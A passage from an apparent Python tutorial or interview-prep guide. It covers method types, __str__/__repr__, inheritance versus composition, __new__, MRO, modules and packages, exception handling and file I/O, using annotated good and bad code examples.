        return cls(['mozzarella', 'tomatoes'])
  
    @classmethod
    def prosciutto(cls):
        return cls(['mozzarella', 'tomatoes', 'ham'])

# Use class methods for alternative constructors
pizza1 = Pizza.margherita()
pizza2 = Pizza.prosciutto()

# Static method: No access to class or instance
class MathUtils:
    @staticmethod
    def add(a, b):
        """Pure utility - doesn't need class or instance."""
        return a + b
  
    @staticmethod
    def is_even(n):
        return n % 2 == 0

# Use static methods for utilities related to class
result = MathUtils.add(10, 20)

# Decision tree:
# - Need access to class? → @classmethod
# - Need access to instance? → instance method
# - Pure utility, related to class? → @staticmethod
# - Pure utility, not related? → regular function

# ✅ GOOD: Class method for factory
from datetime import date

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    @classmethod
    def from_birth_year(cls, name, birth_year):
        age = date.today().year - birth_year
        return cls(name, age)

# ✅ GOOD: Static method for utilities
class StringUtils:
    @staticmethod
    def is_palindrome(s):
        return s == s[::-1]

# ❌ BAD: Static method when you need class
class Config:
    value = 10
  
    @staticmethod
    def get_double():
        return Config.value * 2  # Hardcoded class name!
  
    # ✅ GOOD: Use class method
    @classmethod
    def get_double(cls):
        return cls.value * 2  # Works with inheritance
```

**Why This Matters:** Choosing the right method type affects testability, inheritance behavior, and code clarity.

---

**Q2: What's the difference between `__str__` and `__repr__`?**

**A:**

```python
class User:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    def __str__(self):
        """For end users (informal)."""
        return f"{self.name} ({self.age} years old)"
  
    def __repr__(self):
        """For developers (unambiguous)."""
        return f"User(name={self.name!r}, age={self.age!r})"

user = User("Alice", 30)

# str() - for display
print(str(user))  # "Alice (30 years old)"

# repr() - for debugging
print(repr(user))  # "User(name='Alice', age=30)"

# print() uses __str__ if available, else __repr__
print(user)  # "Alice (30 years old)"

# repr() in containers
users = [user]
print(users)  # [User(name='Alice', age=30)]

# Interactive shell uses repr()
>>> user
User(name='Alice', age=30)

# Guidelines:
# - __repr__: Unambiguous, ideally eval(repr(obj)) recreates obj
# - __str__: Readable, for end users
# - Always implement __repr__
# - __str__ is optional

# ✅ GOOD: __repr__ recreates object
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    def __repr__(self):
        return f"Point({self.x!r}, {self.y!r})"

p = Point(1, 2)
p2 = eval(repr(p))  # Point(1, 2)

# When only __repr__ is defined
class SimpleClass:
    def __repr__(self):
        return "SimpleClass()"

obj = SimpleClass()
print(str(obj))  # "SimpleClass()" (uses __repr__)
print(repr(obj))  # "SimpleClass()"
```

**Why This Matters:** Good `__repr__` makes debugging much easier. Good `__str__` makes output user-friendly.

---

**Q3: When should I use inheritance vs composition?**

**A:**

```python
# Inheritance: "is-a" relationship
class Animal:
    def eat(self):
        return "Eating..."

class Dog(Animal):  # Dog IS AN Animal
    def bark(self):
        return "Woof!"

# Composition: "has-a" relationship
class Engine:
    def start(self):
        return "Engine started"

class Car:  # Car HAS AN Engine
    def __init__(self):
        self.engine = Engine()
  
    def start(self):
        return self.engine.start()

# ❌ BAD: Inheritance for code reuse
class Stack(list):  # Stack is not a list!
    def push(self, item):
        self.append(item)
  
    def pop(self):
        return super().pop()

# Problems:
s = Stack()
s.push(1)
s[0] = 100  # Can bypass stack interface!
s.reverse()  # Stack shouldn't be reversible!

# ✅ GOOD: Composition
class Stack:
    def __init__(self):
        self._items = []  # Private list
  
    def push(self, item):
        self._items.append(item)
  
    def pop(self):
        return self._items.pop()
  
    def is_empty(self):
        return len(self._items) == 0

# Only stack interface exposed

# When to use inheritance:
# 1. Clear "is-a" relationship
# 2. Want polymorphism
# 3. Parent provides significant shared behavior

# When to use composition:
# 1. "has-a" or "uses-a" relationship
# 2. Want flexibility (can swap components)
# 3. Avoid tight coupling
# 4. Multiple inheritance gets complex

# ✅ GOOD: Prefer composition
class DatabaseLogger:
    def __init__(self, db):
        self.db = db  # Composition - can swap database
  
    def log(self, message):
        self.db.insert('logs', {'message': message})

# vs Inheritance (tight coupling)
class DatabaseLogger(Database):  # Inherits from specific DB
    def log(self, message):
        self.insert('logs', {'message': message})

# Modern guideline: "Favor composition over inheritance"
```

**Why This Matters:** Inheritance creates tight coupling and can lead to fragile code. Composition is more flexible and maintainable.

**Related Concepts:** SOLID principles (Section 3.2), Design patterns (Section 3.2)

---

### Interview Questions

**Question 1: What's the difference between `__new__` and `__init__`?**

**Difficulty:** Mid-Level

**SDLC Relevance:** Development

**Answer:**

```python
# __new__: Creates the instance (class method)
# __init__: Initializes the instance (instance method)

class Example:
    def __new__(cls, *args, **kwargs):
        print("1. __new__ called")
        instance = super().__new__(cls)
        print(f"2. Created instance: {id(instance)}")
        return instance
  
    def __init__(self, value):
        print(f"3. __init__ called on {id(self)}")
        self.value = value

obj = Example(42)
# Output:
# 1. __new__ called
# 2. Created instance: 140234567890
# 3. __init__ called on 140234567890

# Key differences:
# 1. __new__ is called before __init__
# 2. __new__ is a static method (takes cls)
# 3. __new__ must return an instance
# 4. __init__ returns None
# 5. __new__ can return instance of different class

# ✅ GOOD: __new__ for singleton pattern
class Singleton:
    _instance = None
  
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

s1 = Singleton()
s2 = Singleton()
print(s1 is s2)  # True (same instance)

# ✅ GOOD: __new__ for immutable types
class PositiveInt(int):
    def __new__(cls, value):
        if value < 0:
            raise ValueError("Must be positive")
        return super().__new__(cls, value)

n = PositiveInt(5)  # Works
# n = PositiveInt(-5)  # ValueError

# Why __new__ needed:
# int is immutable, so value must be set during creation
# __init__ is too late (instance already created)

# ✅ GOOD: __new__ for controlling instance creation
class LimitedInstances:
    _instances = []
    MAX_INSTANCES = 3
  
    def __new__(cls):
        if len(cls._instances) >= cls.MAX_INSTANCES:
            raise RuntimeError("Max instances reached")
        instance = super().__new__(cls)
        cls._instances.append(instance)
        return instance
```

**Key Points to Mention:**

- `__new__` creates instance, `__init__` initializes it
- `__new__` is static method, takes `cls`
- `__new__` must return an instance
- `__new__` runs before `__init__`
- Use `__new__` for singletons, immutable types, instance control

**Why This Matters:** Understanding object creation is essential for design patterns (singleton, factory) and working with immutable types.

---

**Question 2: Explain Method Resolution Order (MRO) in multiple inheritance.**

**Difficulty:** Senior

**SDLC Relevance:** System Design, Development

**Answer:**

```python
# MRO determines which method is called in multiple inheritance

class A:
    def method(self):
        return "A"

class B(A):
    def method(self):
        return "B"

class C(A):
    def method(self):
        return "C"

class D(B, C):
    pass

# Which method does D use?
d = D()
print(d.method())  # "B"

# Why? Check MRO:
print(D.__mro__)
# (<class 'D'>, <class 'B'>, <class 'C'>, <class 'A'>, <class 'object'>)

# MRO uses C3 Linearization algorithm
# Rules:
# 1. Child before parent
# 2. Parents in order listed
# 3. Consistent with each parent's MRO

# Diamond problem:
#     A
#    / \
#   B   C
#    \ /
#     D

# MRO ensures A is only visited once, at the end

# ✅ GOOD: super() follows MRO
class A:
    def method(self):
        print("A")

class B(A):
    def method(self):
        print("B")
        super().method()  # Calls next in MRO

class C(A):
    def method(self):
        print("C")
        super().method()

class D(B, C):
    def method(self):
        print("D")
        super().method()

d = D()
d.method()
# Output:
# D
# B
# C
# A

# Why: super() uses MRO, not just parent
# D → B → C → A (from MRO)

# ❌ BAD: Calling parent directly
class D(B, C):
    def method(self):
        print("D")
        B.method(self)  # Only calls B, skips C!

# MRO conflict example:
class X: pass
class Y(X): pass
class Z(X, Y): pass  # TypeError!
# Cannot create consistent MRO
# Z → X → Y → X (X appears twice!)

# ✅ GOOD: Design for MRO
class Base:
    def __init__(self):
        super().__init__()

class Mixin1(Base):
    def __init__(self):
        print("Mixin1")
        super().__init__()  # Continues MRO chain

class Mixin2(Base):
    def __init__(self):
        print("Mixin2")
        super().__init__()

class Derived(Mixin1, Mixin2):
    def __init__(self):
        print("Derived")
        super().__init__()

d = Derived()
# Output:
# Derived
# Mixin1
# Mixin2
```

**Key Points to Mention:**

- MRO determines method lookup order
- Uses C3 Linearization algorithm
- Child before parent, left to right
- `super()` follows MRO, not just immediate parent
- Check with `__mro__` or `.mro()`
- Always use `super()` for cooperative multiple inheritance

**Why This Matters:** MRO is critical for multiple inheritance, mixins, and cooperative class design. Misunderstanding leads to subtle bugs.

**Related Concepts:** Mixins (this section), Design patterns (Section 3.2)

---

### Key Takeaways

**Object-Oriented Programming:**

- **Classes and objects**: Classes are blueprints, objects are instances
- **__init__**: Initialize instance attributes; avoid mutable defaults
- **Instance vs class attributes**: Instance = per object, Class = shared
- **Methods**: Instance (self), class (@classmethod), static (@staticmethod)
- **Properties**: Use @property for computed attributes and validation
- **Inheritance**: "is-a" relationship; prefer composition when possible
- **MRO**: Determines method lookup; use `super()` for cooperative inheritance
- **Abstract classes**: Define interfaces with ABC; enforce implementation
- **Mixins**: Provide reusable behavior; name with "Mixin" suffix
- **Special methods**: Implement protocols (__str__, __eq__, __len__, etc.)
- **Data classes**: Use @dataclass for simple data containers
- **Enums**: Type-safe constants; use for fixed sets of values

**Best Practices:**

- Favor composition over inheritance
- Use properties for validation and computed values
- Implement `__repr__` for debugging
- Use ABCs to define interfaces
- Follow SOLID principles
- Keep classes focused (single responsibility)
- Use data classes for simple data storage

---

## 1.7 Modules and Packages

**SDLC Phase:** Development, Deployment

**Relevant For:**

- [ ] Requirements gathering
- [X] System design (code organization)
- [X] Development
- [ ] Testing
- [X] Deployment (packaging)
- [X] Maintenance (modularity)

Modules and packages organize code into reusable units, enabling better structure, namespace management, and code sharing.

### Module Basics

#### Module Creation

```python
# File: mymodule.py
"""My custom module."""

# Module-level variables
PI = 3.14159
VERSION = "1.0.0"

# Functions
def greet(name):
    return f"Hello, {name}!"

def calculate_area(radius):
    return PI * radius ** 2

# Classes
class Circle:
    def __init__(self, radius):
        self.radius = radius
  
    def area(self):
        return calculate_area(self.radius)

# Module initialization code
print(f"Module {__name__} loaded")
```

#### Importing Modules

```python
# Import entire module
import mymodule

print(mymodule.PI)  # 3.14159
print(mymodule.greet("Alice"))  # "Hello, Alice!"
circle = mymodule.Circle(5)

# Import specific items
from mymodule import greet, PI

print(PI)  # 3.14159
print(greet("Bob"))  # "Hello, Bob!"

# Import with alias
import mymodule as mm

print(mm.VERSION)  # "1.0.0"

# Import all (avoid in production)
from mymodule import *  # ❌ BAD: Pollutes namespace

# ✅ GOOD: Be explicit
from mymodule import greet, calculate_area, Circle
```

#### Module Search Path (sys.path)

```python
import sys

# Python searches for modules in this order:
print(sys.path)
# [
#     '',  # Current directory
#     '/usr/lib/python3.11',  # Standard library
#     '/usr/lib/python3.11/site-packages',  # Third-party packages
#     ...
# ]

# Add directory to path
sys.path.insert(0, '/path/to/modules')

# ⚠️ CAUTION: Modifying sys.path at runtime
# Better to use PYTHONPATH environment variable
# export PYTHONPATH=/path/to/modules
```

#### __name__ and __main__

```python
# File: script.py
def main():
    print("Running main function")

# Only run if executed directly (not imported)
if __name__ == "__main__":
    main()

# When imported: __name__ == "script"
# When executed: __name__ == "__main__"

# ✅ GOOD: Makes module both importable and executable
# File: utils.py
def helper():
    return "Helper function"

def main():
    print("Testing helper:")
    print(helper())

if __name__ == "__main__":
    main()  # Only runs when executed directly

# Can import and use
from utils import helper
```

#### Module Reloading

```python
import importlib

# Import module
import mymodule

# Modify mymodule.py...

# Reload module
importlib.reload(mymodule)

# ⚠️ CAUTION: Reloading is tricky
# - Existing references not updated
# - Better to restart Python interpreter
```

#### Circular Imports

```python
# ❌ BAD: Circular import
# File: module_a.py
from module_b import function_b

def function_a():
    return function_b()

# File: module_b.py
from module_a import function_a

def function_b():
    return function_a()

# ImportError: cannot import name 'function_a'

# ✅ FIX 1: Import inside function
# File: module_a.py
def function_a():
    from module_b import function_b
    return function_b()

# ✅ FIX 2: Restructure (best)
# Create module_c.py with shared code
# Both module_a and module_b import from module_c

# ✅ FIX 3: Import module, not function
# File: module_a.py
import module_b

def function_a():
    return module_b.function_b()
```

### Packages

#### Package Structure

```python
# Package directory structure:
mypackage/
├── __init__.py          # Makes it a package
├── module1.py
├── module2.py
└── subpackage/
    ├── __init__.py
    ├── module3.py
    └── module4.py

# File: mypackage/__init__.py
"""My package."""

# Package initialization
VERSION = "1.0.0"

# Import commonly used items
from .module1 import important_function
from .module2 import ImportantClass

__all__ = ['important_function', 'ImportantClass', 'VERSION']

# File: mypackage/module1.py
def important_function():
    return "Important!"

# Usage:
import mypackage
print(mypackage.VERSION)
print(mypackage.important_function())
```

#### __init__.py

```python
# Modern Python (3.3+): __init__.py is optional for packages
# But still useful for:
# 1. Package initialization
# 2. Convenient imports
# 3. Defining __all__

# File: mypackage/__init__.py
print("Initializing mypackage")

# Make submodules easily accessible
from .module1 import func1
from .module2 import func2
from .subpackage import module3

# Define what * imports
__all__ = ['func1', 'func2', 'module3']

# Package metadata
__version__ = "1.0.0"
__author__ = "Your Name"
```

#### Subpackages

```python
# Nested package structure:
company/
├── __init__.py
├── web/
│   ├── __init__.py
│   ├── views.py
│   └── models.py
└── api/
    ├── __init__.py
    ├── v1/
    │   ├── __init__.py
    │   └── endpoints.py
    └── v2/
        ├── __init__.py
        └── endpoints.py

# Import from nested packages
from company.web import views
from company.api.v1 import endpoints
```

#### Relative Imports

```python
# Absolute imports (preferred)
from mypackage.module1 import func1
from mypackage.subpackage.module3 import func3

# Relative imports (within package)
# File: mypackage/module2.py
from .module1 import func1  # Same package
from ..other_package import other_func  # Parent package
from .subpackage.module3 import func3  # Subpackage

# Relative import rules:
# . = current package
# .. = parent package
# ... = grandparent package

# ⚠️ CAUTION: Relative imports only work inside packages
# Can't use in __main__ script

# ✅ GOOD: Use relative imports within package
# ✅ GOOD: Use absolute imports from outside
```

#### Namespace Packages (PEP 420)

```python
# Namespace packages: No __init__.py required
# Allows splitting package across multiple directories

# Directory 1:
namespace_package/
└── module1.py

# Directory 2:
namespace_package/
└── module2.py

# Both directories in sys.path
# Python automatically creates namespace package

# Import works from both:
from namespace_package import module1
from namespace_package import module2
```

#### Package Organization Best Practices

```python
# ✅ GOOD: Flat is better than nested
myproject/
├── myproject/
│   ├── __init__.py
│   ├── core.py
│   ├── utils.py
│   └── models.py
├── tests/
│   ├── test_core.py
│   └── test_utils.py
├── docs/
├── README.md
└── setup.py

# ✅ GOOD: Group related functionality
web_app/
├── web_app/
│   ├── __init__.py
│   ├── models/
│   │   ├── __init__.py
│   │   ├── user.py
│   │   └── post.py
│   ├── views/
│   │   ├── __init__.py
│   │   ├── user_views.py
│   │   └── post_views.py
│   └── utils/
│       ├── __init__.py
│       └── helpers.py
└── tests/

# ❌ BAD: Over-nesting
myproject/
└── myproject/
    └── core/
        └── utils/
            └── helpers/
                └── string_helpers.py
```

### Import System Internals

#### Import Machinery

```python
# Import process:
# 1. Check sys.modules cache
# 2. Find module (finders)
# 3. Load module (loaders)
# 4. Execute module code
# 5. Add to sys.modules

import sys

# Check if module already loaded
if 'mymodule' in sys.modules:
    print("Module already loaded")

# Manual import using importlib
import importlib

spec = importlib.util.find_spec('mymodule')
if spec is not None:
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    sys.modules['mymodule'] = module
```

#### sys.modules Cache

```python
import sys

# All loaded modules
print(sys.modules.keys())

# Check if module loaded
'os' in sys.modules  # True (if os imported)

# Remove from cache (forces reload)
if 'mymodule' in sys.modules:
    del sys.modules['mymodule']

import mymodule  # Reloads module
```

#### Import Performance Optimization

```python
# ❌ SLOW: Import in loop
for i in range(1000):
    import math
    result = math.sqrt(i)

# ✅ FAST: Import once
import math
for i in range(1000):
    result = math.sqrt(i)

# ✅ GOOD: Lazy import (when needed)
def process_data(data):
    # Only import if needed
    import pandas as pd
    df = pd.DataFrame(data)
    return df.describe()

# ✅ GOOD: Conditional import
try:
    import ujson as json  # Faster alternative
except ImportError:
    import json  # Fallback

# Startup time optimization
# Import heavy modules only when needed
def analyze():
    import numpy as np  # Heavy module
    import matplotlib.pyplot as plt
    # Use numpy and matplotlib

# vs importing at top (slower startup)
```

### Standard Library Organization

```python
# Core built-ins (no import needed)
print, len, str, int, list, dict, set

# Standard library modules (import needed)
import os  # OS interface
import sys  # System-specific
import math  # Math functions
import datetime  # Date/time
import json  # JSON encoding/decoding
import re  # Regular expressions
import collections  # Container datatypes
import itertools  # Iterator functions
import functools  # Higher-order functions

# Common standard library modules:
# - os, sys, pathlib: File system
# - json, csv, xml: Data formats
# - datetime, time: Date/time
# - re: Regular expressions
# - math, random: Mathematics
# - collections, itertools, functools: Data structures and functions
# - threading, multiprocessing, asyncio: Concurrency
# - unittest, doctest: Testing
# - logging: Logging
# - argparse: Command-line parsing
```

### Key Takeaways

**Modules and Packages:**

- **Modules**: Single Python file; use for grouping related code
- **Packages**: Directory with `__init__.py`; use for larger projects
- **Imports**: Be explicit; prefer absolute imports
- **__name__ == "__main__"**: Makes modules executable and importable
- **Circular imports**: Fix with restructuring or late imports
- **sys.path**: Python's module search path
- **Relative imports**: Use within packages (., .., ...)
- **Namespace packages**: No `__init__.py` needed (PEP 420)
- **Import optimization**: Import once, use lazy imports for heavy modules

---

## 1.8 Exception Handling

**SDLC Phase:** Development, Testing

**Relevant For:**

- [ ] Requirements gathering
- [ ] System design
- [X] Development (error handling)
- [X] Testing (error cases)
- [ ] Deployment
- [X] Maintenance (debugging)

Exceptions handle errors and exceptional conditions, enabling robust, maintainable code.

### Exception Fundamentals

#### try/except/else/finally

```python
# Basic exception handling
try:
    result = 10 / 0
except ZeroDivisionError:
    print("Cannot divide by zero!")

# Multiple except blocks
try:
    value = int("abc")
except ValueError:
    print("Invalid integer")
except TypeError:
    print("Wrong type")

# Catch multiple exceptions
try:
    risky_operation()
except (ValueError, TypeError) as e:
    print(f"Error: {e}")

# else clause (runs if no exception)
try:
    result = 10 / 2
except ZeroDivisionError:
    print("Error!")
else:
    print(f"Result: {result}")  # Runs if no exception

# finally clause (always runs)
try:
    f = open('file.txt')
    process(f)
except IOError:
    print("File error")
finally:
    f.close()  # Always closes file

# ✅ GOOD: Complete structure
try:
    # Try risky code
    result = risky_operation()
except SpecificError as e:
    # Handle specific error
    log_error(e)
else:
    # Runs if no exception
    process_result(result)
finally:
    # Always runs (cleanup)
    cleanup()
```

#### Exception Hierarchy

```python
# Built-in exception hierarchy:
BaseException
├── SystemExit
├── KeyboardInterrupt
├── GeneratorExit
└── Exception
    ├── StopIteration
    ├── ArithmeticError
    │   ├── ZeroDivisionError
    │   ├── OverflowError
    │   └── FloatingPointError
    ├── AttributeError
    ├── EOFError
    ├── ImportError
    ├── LookupError
    │   ├── IndexError
    │   └── KeyError
    ├── NameError
    ├── OSError
    │   ├── FileNotFoundError
    │   ├── PermissionError
    │   └── TimeoutError
    ├── RuntimeError
    ├── TypeError
    ├── ValueError
    └── ...

# ✅ GOOD: Catch specific exceptions
try:
    users[user_id]
except KeyError:
    print(f"User {user_id} not found")

# ❌ BAD: Catch all exceptions
try:
    risky_operation()
except:  # Catches everything, even KeyboardInterrupt!
    pass

# ✅ BETTER: Catch Exception (not BaseException)
try:
    risky_operation()
except Exception as e:
    log_error(e)

# ⚠️ CAUTION: Catching Exception still catches a lot
# Be as specific as possible
```

#### Built-in Exceptions

```python
# Common exceptions:
ValueError  # Invalid value
TypeError  # Wrong type
KeyError  # Missing dict key
IndexError  # Invalid list index
AttributeError  # Missing attribute
FileNotFoundError  # File doesn't exist
PermissionError  # No permission
ZeroDivisionError  # Division by zero
ImportError  # Import failed
RuntimeError  # Generic runtime error

# Example usage:
def get_user(users, user_id):
    try:
        return users[user_id]
    except KeyError:
        raise ValueError(f"User {user_id} not found")

def divide(a, b):
    if not isinstance(a, (int, float)):
        raise TypeError("a must be numeric")
    if not isinstance(b, (int, float)):
        raise TypeError("b must be numeric")
    if b == 0:
        raise ZeroDivisionError("Cannot divide by zero")
    return a / b
```

#### Raising Exceptions (raise)

```python
# Raise exception
def validate_age(age):
    if age < 0:
        raise ValueError("Age cannot be negative")
    if age > 150:
        raise ValueError("Age unrealistic")
    return age

# Raise with from (exception chaining)
def process_data(data):
    try:
        return json.loads(data)
    except json.JSONDecodeError as e:
        raise ValueError("Invalid JSON data") from e

# Re-raise current exception
try:
    risky_operation()
except Exception as e:
    log_error(e)
    raise  # Re-raises original exception

# ✅ GOOD: Provide context
raise ValueError(f"Invalid value: {value}. Expected range: 0-100")

# ❌ BAD: Generic message
raise ValueError("Invalid value")
```

#### Exception Chaining

```python
# Implicit chaining (exception during handling)
try:
    result = 1 / 0
except ZeroDivisionError:
    result = undefined_var  # NameError

# Traceback shows both exceptions:
# During handling of ZeroDivisionError, another exception occurred...

# Explicit chaining (raise... from)
try:
    data = json.loads(json_string)
except json.JSONDecodeError as e:
    raise ValueError("Invalid data format") from e

# Traceback shows:
# ValueError: Invalid data format
# The above exception was the direct cause of...

# Suppress chaining (raise... from None)
try:
    data = json.loads(json_string)
except json.JSONDecodeError:
    raise ValueError("Invalid data format") from None

# Only shows ValueError (hides original)
```

#### Custom Exceptions

```python
# Basic custom exception
class ValidationError(Exception):
    pass

raise ValidationError("Validation failed")

# Custom exception with attributes
class InsufficientFundsError(Exception):
    def __init__(self, balance, amount):
        self.balance = balance
        self.amount = amount
        super().__init__(
            f"Insufficient funds: balance={balance}, needed={amount}"
        )

try:
    if balance < amount:
        raise InsufficientFundsError(balance, amount)
except InsufficientFundsError as e:
    print(e.balance)  # Access custom attributes
    print(e.amount)

# ✅ GOOD: Exception hierarchy
class AppError(Exception):
    """Base exception for application."""
    pass

class DatabaseError(AppError):
    """Database-related errors."""
    pass

class ValidationError(AppError):
    """Validation errors."""
    pass

# Catch all app errors
try:
    operation()
except AppError:
    # Catches DatabaseError, ValidationError, etc.
    pass
```

#### Best Practices for Exception Handling

```python
# ✅ GOOD: Specific exceptions
try:
    user = users[user_id]
except KeyError:
    user = create_default_user()

# ❌ BAD: Bare except
try:
    user = users[user_id]
except:  # Catches everything!
    user = None

# ✅ GOOD: Use else for success path
try:
    data = load_data()
except IOError:
    print("Error loading data")
else:
    # Only runs if no exception
    process_data(data)

# ✅ GOOD: Use finally for cleanup
f = None
try:
    f = open('file.txt')
    process(f)
finally:
    if f:
        f.close()

# ✅ BETTER: Use context manager
with open('file.txt') as f:
    process(f)  # Automatically closes

# ❌ BAD: Silencing exceptions
try:
    critical_operation()
except:
    pass  # Silent failure!

# ✅ GOOD: Log exceptions
import logging

try:
    critical_operation()
except Exception as e:
    logging.error(f"Operation failed: {e}")
    raise  # Re-raise after logging

# ✅ GOOD: Fail fast
def process_user(user):
    if user is None:
        raise ValueError("User cannot be None")
    # Process user...

# vs
def process_user(user):
    if user is not None:  # Nested logic
        # Process user...
```

### Context Managers for Resource Management

```python
# with statement ensures cleanup
with open('file.txt') as f:
    data = f.read()
# File automatically closed

# Multiple context managers
with open('input.txt') as infile, open('output.txt', 'w') as outfile:
    outfile.write(infile.read())

# ✅ GOOD: Custom context manager (class-based)
class DatabaseConnection:
    def __enter__(self):
        self.conn = connect_to_database()
        return self.conn
  
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()
        return False  # Propagate exceptions

with DatabaseConnection() as conn:
    conn.execute("SELECT * FROM users")

# ✅ GOOD: Custom context manager (function-based)
from contextlib import contextmanager

@contextmanager
def database_connection():
    conn = connect_to_database()
    try:
        yield conn
    finally:
        conn.close()

with database_connection() as conn:
    conn.execute("SELECT * FROM users")
```

### contextlib Module

```python
from contextlib import (
    contextmanager,
    closing,
    suppress,
    redirect_stdout,
)

# @contextmanager - Create context manager from generator
@contextmanager
def timer():
    import time
    start = time.time()
    yield
    end = time.time()
    print(f"Elapsed: {end - start:.2f}s")

with timer():
    # Code to time
    time.sleep(1)

# closing() - Close object after use
from contextlib import closing
from urllib.request import urlopen

with closing(urlopen('http://www.python.org')) as page:
    for line in page:
        print(line)

# suppress() - Suppress specific exceptions
from contextlib import suppress

with suppress(FileNotFoundError):
    os.remove('file.txt')  # No error if file doesn't exist

# redirect_stdout() - Redirect stdout
import io

f = io.StringIO()
with redirect_stdout(f):
    print("Hello")
    print("World")

output = f.getvalue()  # "Hello\nWorld\n"
```

### Exception Groups (Python 3.11+)

```python
# Handle multiple exceptions
try:
    raise ExceptionGroup("Multiple errors", [
        ValueError("Bad value"),
        TypeError("Bad type"),
    ])
except* ValueError as e:
    print(f"Value errors: {e.exceptions}")
except* TypeError as e:
    print(f"Type errors: {e.exceptions}")

# Useful for concurrent operations
async def process_many():
    results = await asyncio.gather(
        task1(),
        task2(),
        task3(),
        return_exceptions=True
    )
  
    errors = [r for r in results if isinstance(r, Exception)]
    if errors:
        raise ExceptionGroup("Processing failed", errors)
```

### Key Takeaways

**Exception Handling:**

- **Catch specific exceptions**: Never use bare `except:`
- **Use try/except/else/finally**: else for success, finally for cleanup
- **Exception chaining**: Use `raise... from` to preserve context
- **Custom exceptions**: Create hierarchy for application errors
- **Context managers**: Guarantee cleanup with `with` statement
- **Fail fast**: Validate early, raise exceptions for invalid input
- **Log exceptions**: Always log before swallowing errors
- **Don't silence exceptions**: Bare `except: pass` hides bugs

---

## 1.9 File I/O and Context Managers

**SDLC Phase:** Development

**Relevant For:**

- [ ] Requirements gathering
- [ ] System design
- [X] Development
- [X] Testing
- [ ] Deployment
- [ ] Maintenance

File I/O handles reading and writing files, with context managers ensuring proper resource cleanup.

### File Operations

#### Opening Files

```python
# Basic file opening
f = open('file.txt', 'r')  # Read mode (default)
content = f.read()
f.close()

# File modes:
# 'r' - Read (default)
# 'w' - Write (overwrites)
# 'a' - Append
# 'x' - Exclusive creation (fails if exists)
# 'b' - Binary mode
# 't' - Text mode (default)
# '+' - Read and write

# Examples:
open('file.txt', 'r')  # Read text
open('file.txt', 'w')  # Write text
open('file.txt', 'a')  # Append text
open('file.txt', 'rb')  # Read binary
open('file.txt', 'wb')  # Write binary
open('file.txt', 'r+')  # Read and write

# ✅ GOOD: Always use context manager
with open('file.txt', 'r') as f:
    content = f.read()
# File automatically closed
```

#### Reading Files

```python
# Read entire file
with open('file.txt') as f:
    content = f.read()  # Returns string

# Read line by line
with open('file.txt') as f:
    for line in f:  # Memory efficient
        print(line.strip())

# Read all lines into list
with open('file.txt') as f:
    lines = f.readlines()  # Returns list

# Read specific number of bytes
with open('file.txt') as f:
    chunk = f.read(100)  # Read 100 bytes

# Read single line
with open('file.txt') as f:
    first_line = f.readline()
    second_line = f.readline()

# ✅ GOOD: Process large files line by line
with open('large_file.txt') as f:
    for line in f:  # Doesn't load entire file
        process(line)

# ❌ BAD: Load entire file
with open('large_file.txt') as f:
    content = f.read()  # Memory issue if file is huge
    process(content)
```

#### Writing Files

```python
# Write to file (overwrites)
with open('output.txt', 'w') as f:
    f.write('Hello, World!\n')
    f.write('Second line\n')

# Write multiple lines
lines = ['Line 1\n', 'Line 2\n', 'Line 3\n']
with open('output.txt', 'w') as f:
    f.writelines(lines)

# Append to file
with open('output.txt', 'a') as f:
    f.write('Appended line\n')

# ✅ GOOD: Write with error handling
try:
    with open('output.txt', 'w') as f:
        f.write(data)
except IOError as e:
    print(f"Error writing file: {e}")
```

#### File Positions

```python
with open('file.txt', 'r') as f:
    # Get current position
    pos = f.tell()  # 0 (start of file)
  
    # Read some data
    data = f.read(10)
    pos = f.tell()  # 10
  
    # Seek to position
    f.seek(0)  # Back to start
    f.seek(5)  # Move to byte 5
    f.seek(0, 2)  # Move to end (offset 0 from end)
  
    # Seek modes:
    # 0 - Absolute position
    # 1 - Relative to current
    # 2 - Relative to end
```

#### Binary vs Text Mode

```python
# Text mode (default)
with open('file.txt', 'r') as f:
    content = f.read()  # Returns str

# Binary mode
with open('file.bin', 'rb') as f:
    content = f.read()  # Returns bytes

# Write binary
data = b'\x00\x01\x02\x03'
with open('file.bin', 'wb') as f:
    f.write(data)

# ✅ GOOD: Binary mode for non-text files
with open('image.png', 'rb') as f:
    image_data = f.read()

with open('copy.png', 'wb') as f:
    f.write(image_data)
```

#### Encoding Specification

```python
# Specify encoding (text mode)
with open('file.txt', 'r', encoding='utf-8') as f:
    content = f.read()

# Common encodings:
# 'utf-8' - Unicode (recommended)
# 'ascii' - ASCII only
# 'latin-1' - Western European
# 'cp1252' - Windows Western European

# ✅ GOOD: Always specify encoding
with open('file.txt', 'w', encoding='utf-8') as f:
    f.write('Hello, 世界!')

# Handle encoding errors
with open('file.txt', encoding='utf-8', errors='replace') as f:
    content = f.read()  # Replaces invalid chars with �

# Error handling modes:
# 'strict' - Raise error (default)
# 'ignore' - Skip invalid chars
# 'replace' - Replace with �
# 'backslashreplace' - Replace with \xNN
```

#### pathlib Module

```python
from pathlib import Path

# Create Path object
p = Path('file.txt')
p = Path('/home/user/file.txt')
p = Path.home() / 'documents' / 'file.txt'

# Read file
content = p.read_text(encoding='utf-8')
binary = p.read_bytes()

# Write file
p.write_text('Hello, World!', encoding='utf-8')
p.write_bytes(b'\x00\x01\x02')

# File properties
print(p.exists())  # True if exists
print(p.is_file())  # True if file
print(p.is_dir())  # True if directory
print(p.stat().st_size)  # File size in bytes

# Path operations
print(p.name)  # 'file.txt'
print(p.stem)  # 'file'
print(p.suffix)  # '.txt'
print(p.parent)  # Parent directory
print(p.absolute())  # Absolute path

# ✅ GOOD: pathlib for path operations
data_dir = Path('data')
data_dir.mkdir(exist_ok=True)  # Create directory

for file_path in data_dir.glob('*.txt'):
    process(file_path.read_text())
```

#### File Buffering

```python
# Default buffering (platform-dependent)
f = open('file.txt', 'w')

# Unbuffered (binary mode only)
f = open('file.bin', 'wb', buffering=0)

# Line buffered (text mode)
f = open('file.txt', 'w', buffering=1)

# Custom buffer size
f = open('file.txt', 'w', buffering=8192)

# Flush buffer manually
f = open('file.txt', 'w')
f.write('data')
f.flush()  # Force write to disk
```

### Working with Directories

```python
import os
import shutil
from pathlib import Path

# os module
os.getcwd()  # Current directory
